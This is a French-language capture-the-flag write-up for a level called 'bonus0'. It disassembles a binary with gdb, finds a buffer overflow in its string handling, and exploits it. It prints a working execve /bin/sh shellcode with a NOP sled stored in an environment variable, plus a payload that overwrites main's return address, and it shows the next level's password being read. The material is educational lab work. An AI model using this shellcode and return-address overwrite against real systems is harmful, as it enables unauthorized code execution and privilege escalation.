# Bonus0

On observe un executable a la racine `bonus0`

```bash
$ ./bonus0
 -
Hello
 -
World
Hello World

$ ./bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��� AAAAAAAAAAAAAAAAAAAA���
Segmentation fault (core dumped)
```

On cherche donc a comprendre ce que fait l'executable

```bash
$ gdb bonus0 -q
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:      push   ebp
   0x080485a5 <+1>:      mov    ebp,esp
   0x080485a7 <+3>:      and    esp,0xfffffff0
   0x080485aa <+6>:      sub    esp,0x40
   0x080485ad <+9>:      lea    eax,[esp+0x16]
   0x080485b1 <+13>:     mov    DWORD PTR [esp],eax
   0x080485b4 <+16>:     call   0x804851e <pp>
   0x080485b9 <+21>:     lea    eax,[esp+0x16]
   0x080485bd <+25>:     mov    DWORD PTR [esp],eax
   0x080485c0 <+28>:     call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:     mov    eax,0x0
   0x080485ca <+38>:     leave
   0x080485cb <+39>:     ret
End of assembler dump.
(gdb) disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:      push   ebp
   0x0804851f <+1>:      mov    ebp,esp
   0x08048521 <+3>:      push   edi
   0x08048522 <+4>:      push   ebx
   0x08048523 <+5>:      sub    esp,0x50
   0x08048526 <+8>:      mov    DWORD PTR [esp+0x4],0x80486a0
   0x0804852e <+16>:     lea    eax,[ebp-0x30]
   0x08048531 <+19>:     mov    DWORD PTR [esp],eax
   0x08048534 <+22>:     call   0x80484b4 <p>
   0x08048539 <+27>:     mov    DWORD PTR [esp+0x4],0x80486a0
   0x08048541 <+35>:     lea    eax,[ebp-0x1c]
   0x08048544 <+38>:     mov    DWORD PTR [esp],eax
   0x08048547 <+41>:     call   0x80484b4 <p>
   0x0804854c <+46>:     lea    eax,[ebp-0x30]
   0x0804854f <+49>:     mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+53>:     mov    eax,DWORD PTR [ebp+0x8]
   0x08048556 <+56>:     mov    DWORD PTR [esp],eax
   0x08048559 <+59>:     call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:     mov    ebx,0x80486a4
   0x08048563 <+69>:     mov    eax,DWORD PTR [ebp+0x8]
   0x08048566 <+72>:     mov    DWORD PTR [ebp-0x3c],0xffffffff
   0x0804856d <+79>:     mov    edx,eax
   0x0804856f <+81>:     mov    eax,0x0
   0x08048574 <+86>:     mov    ecx,DWORD PTR [ebp-0x3c]
   0x08048577 <+89>:     mov    edi,edx
   0x08048579 <+91>:     repnz scas al,BYTE PTR es:[edi]
   0x0804857b <+93>:     mov    eax,ecx
   0x0804857d <+95>:     not    eax
   0x0804857f <+97>:     sub    eax,0x1
   0x08048582 <+100>:    add    eax,DWORD PTR [ebp+0x8]
   0x08048585 <+103>:    movzx  edx,WORD PTR [ebx]
   0x08048588 <+106>:    mov    WORD PTR [eax],dx
   0x0804858b <+109>:    lea    eax,[ebp-0x1c]
   0x0804858e <+112>:    mov    DWORD PTR [esp+0x4],eax
   0x08048592 <+116>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048595 <+119>:    mov    DWORD PTR [esp],eax
   0x08048598 <+122>:    call   0x8048390 <strcat@plt>
   0x0804859d <+127>:    add    esp,0x50
   0x080485a0 <+130>:    pop    ebx
   0x080485a1 <+131>:    pop    edi
   0x080485a2 <+132>:    pop    ebp
   0x080485a3 <+133>:    ret
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:      push   ebp
   0x080484b5 <+1>:      mov    ebp,esp
   0x080484b7 <+3>:      sub    esp,0x1018
   0x080484bd <+9>:      mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>:     mov    DWORD PTR [esp],eax
   0x080484c3 <+15>:     call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:     mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>:     lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:     mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:     mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:     call   0x8048380 <read@plt>
   0x080484e6 <+50>:     mov    DWORD PTR [esp+0x4],0xa
   0x080484ee <+58>:     lea    eax,[ebp-0x1008]
   0x080484f4 <+64>:     mov    DWORD PTR [esp],eax
   0x080484f7 <+67>:     call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:     mov    BYTE PTR [eax],0x0
   0x080484ff <+75>:     lea    eax,[ebp-0x1008]
   0x08048505 <+81>:     mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:     mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:     mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:     mov    DWORD PTR [esp],eax
   0x08048517 <+99>:     call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:    leave
   0x0804851d <+105>:    ret
End of assembler dump.
```

On va utiliser `Cutter` pour avoir un idee plus clair de `bonus0`

```bash
$ scp -P 4242 -r bonus0@192.168.56.102:/home/user/bonus0/bonus0 .

$ ./Cutter-v2.1.2-Linux-x86_64.AppImage bonus0
```

_resultat sauvegarde dans [source.md](source.md)_

On peut faire quelque test avec l'executable

```bash
$ (python -c 'print("A" * 19)' ; python -c 'print("B" * 19)') | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBB

$ (python -c 'print("A" * 19)' ; python -c 'print("B" * 20)') | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB���

$ (python -c 'print("A" * 20)' ; python -c 'print("B" * 20)') | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
Segmentation fault (core dumped)
```

On remarque que le retour du main est ecraser

```bash
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
hello
 -
world
hello world

Breakpoint 1, 0x080485ca in main ()
(gdb) ni
0x080485cb in main ()
(gdb) ni
0xb7e454d3 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6

(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

Breakpoint 1, 0x080485ca in main ()
(gdb) ni
0x080485cb in main ()
(gdb) ni
0x42424242 in ?? ()
```

On peut alors modifier le retour du main et le faire pointer vers une variable d'env que lon va creer de suite

```bash
$ export Shellcode=$(python -c 'print "\x90"*100 +"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"')
```

On va recuperer l'adresse de cette variable d'env

```bash
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
Ctrl+D
Program received signal SIGSEGV, Segmentation fault.
0x080484fc in p ()
(gdb) x/s *((char **)environ)
0xbffff7dc: "Shellcode=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Phn/shh//bi\211\343P\211\341P\211\342\260\v̀"
```

Le parametre 1 a besoin de faire `20 octets` pour pouvoir avoir le comportement souhaite

On cherche maintenant quel endroit du parametre 2 modifi la valeur de return du main

```bash
(gdb) break *main+39
Breakpoint 1 at 0x80485cb
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAA
 -
abcdefghijklmnopqrstuvwxyz
AAAAAAAAAAAAAAAAAAAAabcdefghijklmnopqrst��� abcdefghijklmnopqrst���

Breakpoint 1, 0x080485cb in main ()
(gdb) ni
0x6d6c6b6a in ?? ()
```

Notre deuxieme parametre aura donc la forme suivant: `"abcdefghi" + "AddressShellCode" + "\x0" * (20-9-4)`

on peut alors essayer

```bash
$ (python -c 'print("A" * 20)' ; python -c 'print("B" * 9 + "\x59\xf8\xff\xbf" + "B" * 7)';cat) | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBBY���BBBBBBB��� BBBBBBBBBY���BBBBBBB���
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
Ctrl+D

bonus0:$ su bonus1
Password:

bonus1:$
```
